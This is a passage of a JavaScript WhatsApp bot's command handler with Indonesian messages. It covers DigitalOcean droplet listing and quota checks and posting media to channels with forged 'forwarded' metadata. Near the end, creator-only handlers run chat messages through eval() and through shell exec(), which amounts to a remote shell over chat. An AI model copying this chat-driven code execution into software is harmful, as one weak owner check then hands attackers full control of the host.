        console.error(error);
        m.reply('❌ Terjadi kesalahan saat membaca daftar grup.');
    }
}
break;
case 'listdroplet': {
    if (!isPremium) return m.reply(mess.premium);
    try {
        const getDroplets = async () => {
            const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                headers: { Authorization: "Bearer " + global.token_do }
            });
            const data = await response.json();
            if (data.error) throw new Error(data.error.message);
            return data.droplets || [];
        };

        const droplets = await getDroplets();
        let mesej = `List droplet DigitalOcean kamu: ${droplets.length}\n\n`;

        if (droplets.length === 0) {
            mesej += 'Tidak ada droplet yang tersedia!';
        } else {
            droplets.forEach(droplet => {
                const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n\n`;
            });
        }

        await dy.sendMessage(m.chat, { text: mesej }, { quoted: fverif });
    } catch (err) {
        m.reply('Terjadi kesalahan: ' + err.message);
    }
}
break;
case "sisadroplet": {
    if (!isPremium) return m.reply(mess.premium);

    const getDropletInfo = async () => {
        try {
            const accountResponse = await fetch('https://api.digitalocean.com/v2/account', {
                headers: { Authorization: `Bearer ${global.token_do}` }
            });
            const dropletsResponse = await fetch('https://api.digitalocean.com/v2/droplets', {
                headers: { Authorization: `Bearer ${global.token_do}` }
            });

            if (accountResponse.ok && dropletsResponse.ok) {
                const accountData = await accountResponse.json();
                const dropletsData = await dropletsResponse.json();

                const dropletLimit = accountData.account.droplet_limit;
                const totalDroplets = dropletsData.droplets.length;
                const remainingDroplets = dropletLimit - totalDroplets;

                return { dropletLimit, remainingDroplets, totalDroplets };
            } else {
                throw new Error('Gagal mendapatkan data akun atau droplet dari DigitalOcean!');
            }
        } catch (err) {
            throw new Error(err.message);
        }
    };

    try {
        const dropletInfo = await getDropletInfo();
        const message = `Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}\n\n` +
                        `Total droplet terpakai: ${dropletInfo.totalDroplets}`;
        await dy.sendMessage(m.chat, { text: message }, { quoted: fverif });
    } catch (err) {
        m.reply(`Terjadi kesalahan: ${err.message}`);
    }
}
break;



case 'kirimmediach': {
    if (!isCreator) return reply(mess.owner)
    if (!m.quoted) return reply(`*Reply* pesan yang berisi gambar, video, atau audio dengan command: ${prefix + command} 120363303267333730@newsletter`);
    if (!text) return reply(`*Example*: ${prefix + command} 120363303267333730@newsletter`);

    const mime = m.quoted.mimetype || '';

    try {
       
        const formattedChannelId = text.trim();

      
        if (!formattedChannelId.endsWith('@newsletter')) {
            return reply('❌ Format ID channel salah! ID harus diakhiri dengan "@newsletter".');
        }

      
        const caption = `DY_NET`;

        
        if (/image/.test(mime)) {
            const media = await m.quoted.download();
         
            await dy.sendMessage(formattedChannelId, {
                image: media,
                caption: caption, 
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterName: botname,
                        newsletterJid: "120363303267333730@newsletter"
                    }
                }
            });
            reply(`✅ Gambar berhasil dikirim ke channel:\n📋 ID: ${formattedChannelId}`);
        } else if (/video/.test(mime)) {
            const media = await m.quoted.download(); 
            await dy.sendMessage(formattedChannelId, {
                video: media,
                caption: caption, 
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterName: botname,
                        newsletterJid: "120363303267333730@newsletter"
                    }
                }
            });
            reply(`✅ Video berhasil dikirim ke channel:\n📋 ID: ${formattedChannelId}`);
        } else if (/audio/.test(mime)) {
            const media = await m.quoted.download(); 
            await dy.sendMessage(formattedChannelId, {
                audio: media, 
                mimetype: 'audio/mp4', 
                caption: caption, 
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterName: botname,
                        newsletterJid: "120363303267333730@newsletter"
                    }
                }
            });
            reply(`✅ Audio berhasil dikirim ke channel:\n📋 ID: ${formattedChannelId}`);
        } else {
            reply('❌ Format file tidak didukung. Hanya gambar, video, atau audio yang dapat dikirim ke channel.');
        }
    } catch (error) {
        console.error(error);
        reply('❌ Terjadi kesalahan saat mengirim media ke channel.');
    }
}
break;




default:
if (global.db.data.chats[m.chat].ai && body != undefined) {
//if (isSticker) return
if (!m.quoted) return
//if (!m.quoted.isBaileys) return
await sleep(2000)
let puki = await fetchUser(`${text}`, "dirimu adalah anyone AI Asisten Di aplikasi WhatsApp Kamu di kembangkan oleh dycoders.xyz saya siap membantu dalam mengerjakan tugas dan bisa menghibur anda", `${pushname}`)
await sleep(3000)
dy.sendMessage(m.chat, { text : puki.result })
}

let bl = db.data.chats[m.chat].blacklist || [];
if (Object.values(bl).find(users => users.id == m.sender)) {
dy.sendMessage(m.chat, { delete: { ...m.key }});
}

if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Cihuyy ke update ${__filename}`)
delete require.cache[file]
require(file)
})
